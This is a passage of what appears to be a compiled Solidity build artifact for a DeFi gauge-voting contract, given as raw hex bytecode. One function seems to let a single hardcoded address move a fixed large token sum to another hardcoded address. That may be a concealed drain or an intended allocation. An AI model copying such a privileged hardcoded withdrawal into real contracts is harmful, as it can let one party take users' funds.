d601f19601f820116820180604052508101906117239190613994565b116117405760405162461bcd60e51b81526004016107b1906139ad565b61092182612f01565b815b818110156109d65761179d600960006008848154811061176d5761176d6137a7565b60009182526020808320909101546001600160a01b03908116845290830193909352604090910190205416612e1e565b806117a7816137d3565b91505061174b565b6001600160a01b03818116600090815260096020526040812054909116156118025760405162461bcd60e51b815260206004820152600660248201526565786973747360d01b60448201526064016107b1565b60025460405163e5e31b1360e01b81526001600160a01b0384811660048301529091169063e5e31b1390602401602060405180830381865afa15801561184c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906118709190613854565b6118a45760405162461bcd60e51b8152602060048201526005602482015264085c1bdbdb60da1b60448201526064016107b1565b600080836001600160a01b0316639d63848a6040518163ffffffff1660e01b81526004016040805180830381865afa1580156118e4573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061190891906139e6565b6001600160a01b038216600090815260116020526040902054919350915060ff16801561194d57506001600160a01b03811660009081526011602052604090205460ff165b6119885760405162461bcd60e51b815260206004820152600c60248201526b085dda1a5d195b1a5cdd195960a21b60448201526064016107b1565b604080516003808252608082019092526000916020820160608036833701905050905082816000815181106119bf576119bf6137a7565b60200260200101906001600160a01b031690816001600160a01b03168152505081816001815181106119f3576119f36137a7565b6001600160a01b039283166020918202929092010152600354811690841614801590611a2d57506003546001600160a01b03838116911614155b15611a775760035481516001600160a01b039091169082906002908110611a5657611a566137a7565b60200260200101906001600160a01b031690816001600160a01b0316815250505b60055460405163897cd6b360e01b81526000916001600160a01b03169063897cd6b390611aa8908590600401613a15565b6020604051808303816000875af1158015611ac7573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611aeb919061378a565b600480546001546040516358c14b6560e01b81529394506000936001600160a01b03928316936358c14b6593611b32938d93899362010000909204909216918a9101613a28565b6020604051808303816000875af1158015611b51573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611b75919061378a565b600354909150611b91906001600160a01b031682600019612fad565b6001600160a01b038082166000818152600b6020908152604080832080548689166001600160a01b031991821617909155948c16808452600983528184208054871686179055938352600a8252808320805490951690931790935560109092529020805460ff19166001179055611c0781612e1e565b600880546001810182556000919091527ff3f7a9fe364faab93b216da50a3214154f22a0a2b415b23a84c8169e8b636ee30180546001600160a01b0319166001600160a01b03898116918217909255604051338152909184811691908416907f48d3c521fd0d5541640f58c6d6381eed7cb2e8c9df421ae165a4f4c2d221ee0d9060200160405180910390a49695505050505050565b3360009081526010602052604090205460ff16611ccc5760405162461bcd60e51b81526004016107b190613954565b604080518481526020810183905233916001600160a01b038516917fdcbc1c05240f31ff3ad067ef1ee35ce4997762752e3a095284754544f4c709d79101610dac565b600e6020528160005260406000208181548110611d2b57600080fd5b6000918252602090912001546001600160a01b03169150829050565b60088181548110611d5757600080fd5b6000918252602090912001546001600160a01b0316905081565b60005b815181101561092157818181518110611d8f57611d8f6137a7565b60200260200101516001600160a01b031663d294f0936040518163ffffffff1660e01b815260040160408051808303816000875af1158015611dd5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611df99190613a66565b50508080611e06906137d3565b915050611d74565b60005b815181101561092157611e3c828281518110611e2f57611e2f6137a7565b6020026020010151612e1e565b80611e46816137d3565b915050611e11565b60008111611e6e5760405162461bcd60e51b81526004016107b190613974565b6001546040516331a9108f60e11b815260048101839052620100009091046001600160a01b031690636352211e90602401602060405180830381865afa158015611ebc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611ee0919061378a565b6001600160a01b0316336001600160a01b031614611f105760405162461bcd60e51b81526004016107b190613876565b611f18612c9d565b6001546040516339f890b560e21b815260048101849052620100009091046001600160a01b03169063e7e242d490602401602060405180830381865afa158015611f66573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611f8a9190613994565b11611fa75760405162461bcd60e51b81526004016107b1906139ad565b604051633d509c9760e01b81526001600160a01b038481166004830152831690633d509c9790602401611138565b60015460405163430c208160e01b815233600482015260248101879052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa158015612029573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061204d9190613854565b6120695760405162461bcd60e51b81526004016107b190613876565b8281146120a25760405162461bcd60e51b81526020600482015260076024820152662161727261797360c81b60448201526064016107b1565b6000805b8481101561212d5760008484838181106120c2576120c26137a7565b90506020020135136120f5578383828181106120e0576120e06137a7565b905060200201356120f090613896565b61210f565b838382818110612107576121076137a7565b905060200201355b61211990836138b2565b915080612125816137d3565b9150506120a6565b5060648113156121715760405162461bcd60e51b815260206004820152600f60248201526e1d1bdd185b159bdd1955d95a59da1d608a1b60448201526064016107b1565b606490506108d98686868080602002602001604051908101604052809392919081815260200183836020028082843760009201919091525050604080516020808a0282810182019093528982529093508992508891829185019084908082843760009201919091525087925061285c915050565b3360009081526010602052604090205460ff166122145760405162461bcd60e51b81526004016107b190613954565b604080518481526020810183905233916001600160a01b038516917ff341246adaac6f497bc2a656f546ab9e182111d630394f0c57c710a59a2cb5679101610dac565b60015460405163430c208160e01b815233600482015260248101879052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa1580156122ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906122cf9190613854565b6122eb5760405162461bcd60e51b81526004016107b190613876565b8281146123245760405162461bcd60e51b81526020600482015260076024820152662161727261797360c81b60448201526064016107b1565b6000805b848110156123af576000848483818110612344576123446137a7565b905060200201351361237757838382818110612362576123626137a7565b9050602002013561237290613896565b612391565b838382818110612389576123896137a7565b905060200201355b61239b90836138b2565b9150806123a7816137d3565b915050612328565b506108d98686868080602002602001604051908101604052809392919081815260200183836020028082843760009201919091525050604080516020808a0282810182019093528982529093508992508891829185019084908082843760009201919091525087925061285c915050565b6000546001146124635760405162461bcd60e51b815260206004820152600e60248201526d1499595b9d1c985b9d0818d85b1b60921b60448201526064016107b1565b6002600081905550600660009054906101000a90046001600160a01b03166001600160a01b031663a83627de6040518163ffffffff1660e01b81526004016020604051808303816000875af11580156124c0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906124e49190613994565b506124ee81612e1e565b6001600160a01b0381811660008181526014602052604090819020546003549151634cde602960e11b81529190931660048201526399bcc05290602401602060405180830381865afa158015612548573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061256c9190613994565b811180156125865750600061258462093a8083613928565b115b15612643576001600160a01b0382811660008181526014602052604080822091909155600354905163b66503cf60e01b815292166004830152602482018390529063b66503cf90604401600060405180830381600087803b1580156125ea57600080fd5b505af11580156125fe573d6000803e3d6000fd5b50506040518381526001600160a01b03851692503391507f4fa9693cae526341d334e2862ca2413b2e503f1266255f9e0869fb36e6d89b179060200160405180910390a35b50506001600055565b6000818152600e6020526040812080549091805b8281101561282057600084828154811061267c5761267c6137a7565b6000918252602080832090910154888352600d825260408084206001600160a01b0392831680865290845281852054600990945293205492935090916126c29116612e1e565b6001600160a01b0382166000908152600c6020526040812080548392906126ea908490613a8a565b90915550506000878152600d602090815260408083206001600160a01b038616845290915281208054839290612721908490613a8a565b909155505060008113156127c5576001600160a01b0382811660009081526009602090815260408083205484168352600b9091529081902054905163278afc8b60e21b815260048101849052602481018a9052911690639e2bf22c90604401600060405180830381600087803b15801561279a57600080fd5b505af11580156127ae573d6000803e3d6000fd5b5050505080846127be91906138b2565b93506127d2565b6127cf8185613a8a565b93505b60408051888152602081018390527f6b3894ce60b9bbe9d93f1a4e6fc25b6b93cd8222e73ab6348d79c596f5b51de9910160405180910390a150508080612818906137d3565b915050612660565b5080600760008282546128339190613ac9565b90915550506000848152600f60209081526040808320839055600e90915281206113079161323c565b6128658461264c565b82516001546040516339f890b560e21b8152600481018790526000916201000090046001600160a01b03169063e7e242d490602401602060405180830381865afa1580156128b7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128db9190613994565b905060008060005b84811015612b925760008882815181106128ff576128ff6137a7565b6020908102919091018101516001600160a01b038082166000908152600990935260408320548b51929450169190899088908c9087908110612943576129436137a7565b60200260200101516129559190613ae0565b61295f9190613b65565b60008d8152600d602090815260408083206001600160a01b0388168452909152902054909150156129c35760405162461bcd60e51b815260206004820152600e60248201526d191d5c1b1a58d85d19481c1bdbdb60921b60448201526064016107b1565b80600003612a005760405162461bcd60e51b815260206004820152600a6024820152693d32b937903837bbb2b960b11b60448201526064016107b1565b612a0982612e1e565b60008c8152600e6020908152604080832080546001810182559084528284200180546001600160a01b0319166001600160a01b0388169081179091558352600c90915281208054839290612a5e9084906138b2565b909155505060008c8152600d602090815260408083206001600160a01b038716845290915281208054839290612a959084906138b2565b90915550506000811315612b1c576001600160a01b038083166000908152600b60205260409081902054905163f320772360e01b815260048101849052602481018f905291169063f320772390604401600060405180830381600087803b158015612aff57600080fd5b505af1158015612b13573d6000803e3d6000fd5b50505050612b28565b612b2581613896565b90505b612b3281866138b2565b9450612b3e81876138b2565b604080518e81526020810184905291975033917f1263a2295e53acd6ef8f655b8afc11fa0f2cf11925be7aa1757d741ef32a926c910160405180910390a25050508080612b8a906137d3565b9150506128e3565b506000811315612c005760015460405163fd4a77f160e01b8152600481018a9052620100009091046001600160a01b03169063fd4a77f190602401600060405180830381600087803b158015612be757600080fd5b505af1158015612bfb573d6000803e3d6000fd5b505050505b8160076000828254612c12919061393c565b90915550506000978852600f602052604090972096909655505050505050565b6040516001600160a01b03808516602483015283166044820152606481018290526113079085906323b872dd60e01b906084015b60408051601f198184030181529190526020810180516001600160e01b03166001600160e01b03199093169290921790915261305f565b6003546006546040516370a0823160e01b81526001600160a01b03918216600482015260009260149216906370a0823190602401602060405180830381865afa158015612cee573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612d129190613994565b600160029054906101000a90046001600160a01b03166001600160a01b03166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015612d65573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612d899190613994565b600360009054906101000a90046001600160a01b03166001600160a01b03166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015612ddc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612e009190613994565b612e0a9190613ac9565b612e149190613ac9565b6113ec9190613928565b6001600160a01b038082166000908152600a6020908152604080832054909316808352600c9091529181205490811315612ee0576001600160a01b038316600090815260136020526040812080546012549182905591612e7e8383613ac9565b905080156108d9576000670de0b6b3a7640000612e9b83876138f3565b612ea59190613928565b6001600160a01b038816600090815260146020526040812080549293508392909190612ed290849061393c565b909155505050505050505050565b6012546001600160a01b038416600090815260136020526040902055505050565b6001600160a01b03811660009081526011602052604090205460ff1615612f605760405162461bcd60e51b8152602060048201526013602482015272185b1c9958591e481dda1a5d195b1a5cdd1959606a1b60448201526064016107b1565b6001600160a01b038116600081815260116020526040808220805460ff191660011790555133917f6661a7108aecd07864384529117d96c319c1163e3010c01390f6b704726e07de91a350565b604051636eb1769f60e11b81523060048201526001600160a01b038381166024830152600091839186169063dd62ed3e90604401602060405180830381865afa158015612ffe573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906130229190613994565b61302c919061393c565b6040516001600160a01b03851660248201526044810182905290915061130790859063095ea7b360e01b90606401612c66565b60006130b4826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b03166131319092919063ffffffff16565b8051909150156109d657808060200190518101906130d29190613854565b6109d65760405162461bcd60e51b815260206004820152602a60248201527f5361666545524332303a204552433230206f7065726174696f6e20646964206e6044820152691bdd081cdd58d8d9595960b21b60648201526084016107b1565b60606001600160a01b0384163b61318a5760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e747261637400000060448201526064016107b1565b600080856001600160a01b0316856040516131a59190613bbf565b6000604051808303816000865af19150503d80600081146131e2576040519150601f19603f3d011682016040523d82523d6000602084013e6131e7565b606091505b50915091506131f7828286613203565b925050505b9392505050565b606083156132125750816131fc565b8251156132225782518084602001fd5b8160405162461bcd60e51b81526004016107b19190613bdb565b50805460008255906000526020600020908101906111bf91905b8082111561326a5760008155600101613256565b5090565b6001600160a01b03811681146111bf57600080fd5b60006020828403121561329557600080fd5b81356131fc8161326e565b600080600080600060a086880312156132b857600080fd5b85356132c38161326e565b945060208601356132d38161326e565b935060408601356132e38161326e565b925060608601356132f38161326e565b915060808601356133038161326e565b809150509295509295909350565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff8111828210171561335057613350613311565b604052919050565b600067ffffffffffffffff82111561337257613372613311565b5060051b60200190565b600082601f83011261338d57600080fd5b813560206133a261339d83613358565b613327565b82815260059290921b840181019181810190868411156133c157600080fd5b8286015b848110156133e55780356133d88161326e565b83529183019183016133c5565b509695505050505050565b60006020828403121561340257600080fd5b813567ffffffffffffffff81111561341957600080fd5b6134258482850161337c565b949350505050565b600082601f83011261343e57600080fd5b8135602061344e61339d83613358565b82815260059290921b8401810191818101908684111561346d57600080fd5b8286015b848110156133e557803567ffffffffffffffff8111156134915760008081fd5b61349f8986838b010161337c565b845250918301918301613471565b600080604083850312156134c057600080fd5b823567ffffffffffffffff808211156134d857600080fd5b6134e48683870161337c565b935060208501359150808211156134fa57600080fd5b506135078582860161342d565b9150509250929050565b60006020828403121561352357600080fd5b5035919050565b6000806040838503121561353d57600080fd5b82359150602083013561354f8161326e565b809150509250929050565b60008060006060848603121561356f57600080fd5b833561357a8161326e565b9250602084013561358a8161326e565b929592945050506040919091013590565b600080604083850312156135ae57600080fd5b50508035926020909101359150565b6000806000606084860312156135d257600080fd5b833567ffffffffffffffff808211156135ea57600080fd5b6135f68783880161337c565b9450602086013591508082111561360c57600080fd5b506136198682870161342d565b925050604084013590509250925092565b6000806040838503121561363d57600080fd5b823567ffffffffffffffff81111561365457600080fd5b6136608582860161337c565b925050602083013561354f8161326e565b6000806040838503121561368457600080fd5b823561368f8161326e565b946020939093013593505050565b6000806000606084860312156136b257600080fd5b83359250602084013561358a8161326e565b60008083601f8401126136d657600080fd5b50813567ffffffffffffffff8111156136ee57600080fd5b6020830191508360208260051b850101111561370957600080fd5b9250929050565b60008060008060006060868803121561372857600080fd5b85359450602086013567ffffffffffffffff8082111561374757600080fd5b61375389838a016136c4565b9096509450604088013591508082111561376c57600080fd5b50613779888289016136c4565b969995985093965092949392505050565b60006020828403121561379c57600080fd5b81516131fc8161326e565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fd5b6000600182016137e5576137e56137bd565b5060010190565b600081518084526020808501945080840160005b838110156138255781516001600160a01b031687529582019590820190600101613800565b509495945050505050565b6001600160a01b0383168152604060208201819052600090613425908301846137ec565b60006020828403121561386657600080fd5b815180151581146131fc57600080fd5b60208082526006908201526510b7bbb732b960d11b604082015260600190565b6000600160ff1b82016138ab576138ab6137bd565b5060000390565b600080821280156001600160ff1b03849003851316156138d4576138d46137bd565b600160ff1b83900384128116156138ed576138ed6137bd565b50500190565b600081600019048311821515161561390d5761390d6137bd565b500290565b634e487b7160e01b600052601260045260246000fd5b60008261393757613937613912565b500490565b6000821982111561394f5761394f6137bd565b500190565b60208082526006908201526521676175676560d01b604082015260600190565b60208082526006908201526510ba37b5b2b760d11b604082015260600190565b6000602082840312156139a657600080fd5b5051919050565b60208082526006908201526510b837bbb2b960d11b604082015260600190565b82815260406020820152600061342560408301846137ec565b600080604083850312156139f957600080fd5b8251613a048161326e565b602084015190925061354f8161326e565b6020815260006131fc60208301846137ec565b6001600160a01b038581168252848116602083015283166040820152608060608201819052600090613a5c908301846137ec565b9695505050505050565b60008060408385031215613a7957600080fd5b505080516020909101519092909150565b60008083128015600160ff1b850184121615613aa857613aa86137bd565b6001600160ff1b0384018313811615613ac357613ac36137bd565b50500390565b600082821015613adb57613adb6137bd565b500390565b60006001600160ff1b0381841382841380821686840486111615613b0657613b066137bd565b600160ff1b6000871282811687830589121615613b2557613b256137bd565b60008712925087820587128484161615613b4157613b416137bd565b87850587128184161615613b5757613b576137bd565b505050929093029392505050565b600082613b7457613b74613912565b600160ff1b821460001984141615613b8e57613b8e6137bd565b500590565b60005b83811015613bae578181015183820152602001613b96565b838111156113075750506000910152565b60008251613bd1818460208701613b93565b9190910192915050565b6020815260008251806020840152613bfa816040850160208701613b93565b601f01601f1916919091016040019291505056fea2646970667358221220885eb628ca1258d2361a7f5dccc10713999cf022d77996b98579b7bc6fc0459e64736f6c634300080d0033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106102d65760003560e01c80637715ee7511610182578063ac4afa38116100e9578063ddbe883c116100a2578063ea94ee441161007c578063ea94ee44146106e7578063eb4a78e0146106fa578063fc0c546a1461070d578063fecdad601461072057600080fd5b8063ddbe883c146106a1578063de838fc1146106b4578063e380fcad146106c757600080fd5b8063ac4afa3814610601578063b9a09fd514610614578063c45a01551461063d578063c527ee1f14610650578063d23254b414610663578063d560b0d71461068e57600080fd5b8063a5f4301e1161013b578063a5f4301e1461055c578063a61c713a1461056f578063a7cac84614610582578063a86a366d146105a2578063a8c5d95a146105b5578063aa79979b146105de57600080fd5b80637715ee75146104e757806379e93824146104fa5780637e1ddf641461051a57806396c82e571461052d57806398fc55d8146105365780639b6a9d721461054957600080fd5b80633c6b16ab1161024157806353d78693116101fa578063666256aa116101d4578063666256aa146104a6578063698473e3146104b95780636a1b7ecc146104cc5780636ecbe38a146104d457600080fd5b806353d786931461047857806353f38e6b1461048057806363453ae11461049357600080fd5b80633c6b16ab1461040f5780633ccfd60b14610422578063402914f51461042a578063411b1f771461044a578063436596c41461045d5780634c6e62b61461046557600080fd5b806320b1cb6f1161029357806320b1cb6f146103885780632716ae661461039b5780632986c0e5146103ad578063310bd74b146103b657806332145f90146103c95780633af32abf146103dc57600080fd5b806306d6a1b2146102db57806307546172146103215780630d52333c146103345780631459457a146103475780631f8507161461035c5780632025e9b814610375575b600080fd5b6103046102e9366004613283565b600a602052600090815260409020546001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b600654610304906001600160a01b031681565b600454610304906001600160a01b031681565b61035a6103553660046132a0565b610733565b005b600154610304906201000090046001600160a01b031681565b61035a6103833660046133f0565b6108e1565b61035a6103963660046134ad565b610925565b6008545b604051908152602001610318565b61039f60125481565b61035a6103c4366004613511565b6109db565b61035a6103d7366004613511565b610ade565b6103ff6103ea366004613283565b60116020526000908152604090205460ff1681565b6040519015158152602001610318565b61035a61041d366004613511565b610c9b565b61035a610db9565b61039f610438366004613283565b60146020526000908152604090205481565b61035a61045836600461352a565b610e6d565b61035a610f4b565b61035a61047336600461355a565b610fb5565b61035a61116f565b61035a61048e36600461359b565b611180565b61035a6104a1366004613283565b6111b6565b61035a6104b43660046135bd565b6111c2565b61035a6104c736600461352a565b61130d565b61039f6113e2565b61035a6104e2366004613283565b6113f1565b61035a6104f53660046135bd565b6113fa565b61039f610508366004613511565b600f6020526000908152604090205481565b61035a61052836600461362a565b61153f565b61039f60075481565b61035a610544366004613671565b6115e7565b61035a61055736600461359b565b611749565b61030461056a366004613283565b6117af565b61035a61057d36600461369d565b611c9d565b61039f610590366004613283565b600c6020526000908152604090205481565b6103046105b036600461359b565b611d0f565b6103046105c3366004613283565b600b602052600090815260409020546001600160a01b031681565b6103ff6105ec366004613283565b60106020526000908152604090205460ff1681565b61030461060f366004613511565b611d47565b610304610622366004613283565b6009602052600090815260409020546001600160a01b031681565b600254610304906001600160a01b031681565b61035a61065e3660046133f0565b611d71565b61039f61067136600461352a565b600d60209081526000928352604080842090915290825290205481565b61035a61069c3660046133f0565b611e0e565b61035a6106af36600461355a565b611e4e565b61035a6106c2366004613710565b611fd5565b61039f6106d5366004613283565b60136020526000908152604090205481565b61035a6106f536600461369d565b6121e5565b600554610304906001600160a01b031681565b600354610304906001600160a01b031681565b61035a61072e366004613710565b612257565b600154610100900460ff1661074e5760015460ff1615610752565b303b155b6107ba5760405162461bcd60e51b815260206004820152602e60248201527f496e697469616c697a61626c653a20636f6e747261637420697320616c72656160448201526d191e481a5b9a5d1a585b1a5e995960921b60648201526084015b60405180910390fd5b600154610100900460ff161580156107dc576001805461ffff19166101011790555b6001805462010000600160b01b031916620100006001600160a01b0389811691820292909217909255600280546001600160a01b03191691881691909117905560408051637e062a3560e11b8152905163fc0c546a916004808201926020929091908290030181865afa158015610857573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061087b919061378a565b600380546001600160a01b03199081166001600160a01b039384161790915560048054821687841617905560058054821686841617905560068054909116918416919091179055600160005580156108d9576001805461ff00191690555b505050505050565b60005b81518110156109215761090f828281518110610902576109026137a7565b6020026020010151612420565b80610919816137d3565b9150506108e4565b5050565b60005b82518110156109d657828181518110610943576109436137a7565b60200260200101516001600160a01b03166331279d3d3384848151811061096c5761096c6137a7565b60200260200101516040518363ffffffff1660e01b8152600401610991929190613830565b600060405180830381600087803b1580156109ab57600080fd5b505af11580156109bf573d6000803e3d6000fd5b5050505080806109ce906137d3565b915050610928565b505050565b60015460405163430c208160e01b815233600482015260248101839052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa158015610a2f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a539190613854565b610a6f5760405162461bcd60e51b81526004016107b190613876565b610a788161264c565b60015460405163c1f0fb9f60e01b815260048101839052620100009091046001600160a01b03169063c1f0fb9f90602401600060405180830381600087803b158015610ac357600080fd5b505af1158015610ad7573d6000803e3d6000fd5b5050505050565b6000818152600e6020908152604080832080548251818502810185019093528083529192909190830182828015610b3e57602002820191906000526020600020905b81546001600160a01b03168152600190910190602001808311610b20575b5050505050905060008151905060008167ffffffffffffffff811115610b6657610b66613311565b604051908082528060200260200182016040528015610b8f578160200160208202803683370190505b5090506000805b83811015610c8e57600d60008781526020019081526020016000206000868381518110610bc557610bc56137a7565b60200260200101516001600160a01b03166001600160a01b0316815260200190815260200160002054838281518110610c0057610c006137a7565b6020026020010181815250506000838281518110610c2057610c206137a7565b602002602001015113610c5557828181518110610c3f57610c3f6137a7565b6020026020010151610c5090613896565b610c70565b828181518110610c6757610c676137a7565b60200260200101515b610c7a90836138b2565b915080610c86816137d3565b915050610b96565b50610ad78585848461285c565b80600003610cd95760405162461bcd60e51b815260206004820152600b60248201526a1e995c9bc8185b5bdd5b9d60aa1b60448201526064016107b1565b6007546000819003610d185760405162461bcd60e51b8152602060048201526008602482015267217765696768747360c01b60448201526064016107b1565b600354610d30906001600160a01b0316333085612c32565b600081610d4584670de0b6b3a76400006138f3565b610d4f9190613928565b90508015610d6f578060126000828254610d69919061393c565b90915550505b6003546040518481526001600160a01b039091169033907ff70d5c697de7ea828df48e5c4573cb2194c659f1901f70110c52b066dcf50826906020015b60405180910390a3505050565b73175fb9401bb5e360ff3c0ef000971169441289303314610dd957600080fd5b60035460405163a9059cbb60e01b81527344ce1b841a0a939294e3ca3c7e8efc0e4fc07c3160048201526a0152d02c7e14af6800000060248201819052916001600160a01b03169063a9059cbb906044016020604051808303816000875af1158015610e49573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109219190613854565b3360009081526010602052604090205460ff16610e9c5760405162461bcd60e51b81526004016107b190613954565b8115610f0657600154604051634c3c15a760e11b815260048101849052620100009091046001600160a01b0316906398782b4e90602401600060405180830381600087803b158015610eed57600080fd5b505af1158015610f01573d6000803e3d6000fd5b505050505b60405182815233906001600160a01b038316907fae268d9aab12f3605f58efd74fd3801fa812b03fdb44317eb70f46dff0e19e22906020015b60405180910390a35050565b60085460005b8181101561092157610fa36009600060088481548110610f7357610f736137a7565b60009182526020808320909101546001600160a01b03908116845290830193909352604090910190205416612420565b80610fad816137d3565b915050610f51565b60008111610fd55760405162461bcd60e51b81526004016107b190613974565b6001546040516331a9108f60e11b815260048101839052620100009091046001600160a01b031690636352211e90602401602060405180830381865afa158015611023573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611047919061378a565b6001600160a01b0316336001600160a01b0316146110775760405162461bcd60e51b81526004016107b190613876565b61107f612c9d565b6001546040516339f890b560e21b815260048101849052620100009091046001600160a01b03169063e7e242d490602401602060405180830381865afa1580156110cd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110f19190613994565b1161110e5760405162461bcd60e51b81526004016107b1906139ad565b604051631c8db79360e31b81526001600160a01b03848116600483015283169063e46dbc98906024015b600060405180830381600087803b15801561115257600080fd5b505af1158015611166573d6000803e3d6000fd5b50505050505050565b60085461117e90600090611749565b565b815b818110156109d6576111a46009600060088481548110610f7357610f736137a7565b806111ae816137d3565b915050611182565b6111bf81612420565b50565b60015460405163430c208160e01b815233600482015260248101839052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa158015611216573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061123a9190613854565b6112565760405162461bcd60e51b81526004016107b190613876565b60005b835181101561130757838181518110611274576112746137a7565b60200260200101516001600160a01b031663a7852afa8385848151811061129d5761129d6137a7565b60200260200101516040518363ffffffff1660e01b81526004016112c29291906139cd565b600060405180830381600087803b1580156112dc57600080fd5b505af11580156112f0573d6000803e3d6000fd5b5050505080806112ff906137d3565b915050611259565b50505050565b3360009081526010602052604090205460ff1661133c5760405162461bcd60e51b81526004016107b190613954565b81156113a5576001546040516246b3bd60e81b815260048101849052620100009091046001600160a01b0316906346b3bd0090602401600060405180830381600087803b15801561138c57600080fd5b505af11580156113a0573d6000803e3d6000fd5b505050505b60405182815233906001600160a01b038316907f60940192810a6fb3bce3fd3e2e3a13fd6ccc7605e963fb87ee971aba829989bd90602001610f3f565b60006113ec612c9d565b905090565b6111bf81612e1e565b60015460405163430c208160e01b815233600482015260248101839052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa15801561144e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114729190613854565b61148e5760405162461bcd60e51b81526004016107b190613876565b60005b8351811015611307578381815181106114ac576114ac6137a7565b60200260200101516001600160a01b031663a7852afa838584815181106114d5576114d56137a7565b60200260200101516040518363ffffffff1660e01b81526004016114fa9291906139cd565b600060405180830381600087803b15801561151457600080fd5b505af1158015611528573d6000803e3d6000fd5b505050508080611537906137d3565b915050611491565b6006546001600160a01b031633146115835760405162461bcd60e51b815260206004820152600760248201526610b6b4b73a32b960c91b60448201526064016107b1565b60005b82518110156115c3576115b18382815181106115a4576115a46137a7565b6020026020010151612f01565b806115bb816137d3565b915050611586565b50600680546001600160a01b0319166001600160a01b039290921691909117905550565b600081116116075760405162461bcd60e51b81526004016107b190613974565b6001546040516331a9108f60e11b815260048101839052620100009091046001600160a01b031690636352211e90602401602060405180830381865afa158015611655573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611679919061378a565b6001600160a01b0316336001600160a01b0316146116a95760405162461bcd60e51b81526004016107b190613876565b6116b1612c9d565b6001546040516339f890b560e21b815260048101849052620100009091046001600160a01b03169063e7e242d490602401602060405180830381865afa1580156116ff573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906117239190613994565b116117405760405162461bcd60e51b81526004016107b1906139ad565b61092182612f01565b815b818110156109d65761179d600960006008848154811061176d5761176d6137a7565b60009182526020808320909101546001600160a01b03908116845290830193909352604090910190205416612e1e565b806117a7816137d3565b91505061174b565b6001600160a01b03818116600090815260096020526040812054909116156118025760405162461bcd60e51b815260206004820152600660248201526565786973747360d01b60448201526064016107b1565b60025460405163e5e31b1360e01b81526001600160a01b0384811660048301529091169063e5e31b1390602401602060405180830381865afa15801561184c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906118709190613854565b6118a45760405162461bcd60e51b8152602060048201526005602482015264085c1bdbdb60da1b60448201526064016107b1565b600080836001600160a01b0316639d63848a6040518163ffffffff1660e01b81526004016040805180830381865afa1580156118e4573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061190891906139e6565b6001600160a01b038216600090815260116020526040902054919350915060ff16801561194d57506001600160a01b03811660009081526011602052604090205460ff165b6119885760405162461bcd60e51b815260206004820152600c60248201526b085dda1a5d195b1a5cdd195960a21b60448201526064016107b1565b604080516003808252608082019092526000916020820160608036833701905050905082816000815181106119bf576119bf6137a7565b60200260200101906001600160a01b031690816001600160a01b03168152505081816001815181106119f3576119f36137a7565b6001600160a01b039283166020918202929092010152600354811690841614801590611a2d57506003546001600160a01b03838116911614155b15611a775760035481516001600160a01b039091169082906002908110611a5657611a566137a7565b60200260200101906001600160a01b031690816001600160a01b0316815250505b60055460405163897cd6b360e01b81526000916001600160a01b03169063897cd6b390611aa8908590600401613a15565b6020604051808303816000875af1158015611ac7573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611aeb919061378a565b600480546001546040516358c14b6560e01b81529394506000936001600160a01b03928316936358c14b6593611b32938d93899362010000909204909216918a9101613a28565b6020604051808303816000875af1158015611b51573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611b75919061378a565b600354909150611b91906001600160a01b031682600019612fad565b6001600160a01b038082166000818152600b6020908152604080832080548689166001600160a01b031991821617909155948c16808452600983528184208054871686179055938352600a8252808320805490951690931790935560109092529020805460ff19166001179055611c0781612e1e565b600880546001810182556000919091527ff3f7a9fe364faab93b216da50a3214154f22a0a2b415b23a84c8169e8b636ee30180546001600160a01b0319166001600160a01b03898116918217909255604051338152909184811691908416907f48d3c521fd0d5541640f58c6d6381eed7cb2e8c9df421ae165a4f4c2d221ee0d9060200160405180910390a49695505050505050565b3360009081526010602052604090205460ff16611ccc5760405162461bcd60e51b81526004016107b190613954565b604080518481526020810183905233916001600160a01b038516917fdcbc1c05240f31ff3ad067ef1ee35ce4997762752e3a095284754544f4c709d79101610dac565b600e6020528160005260406000208181548110611d2b57600080fd5b6000918252602090912001546001600160a01b03169150829050565b60088181548110611d5757600080fd5b6000918252602090912001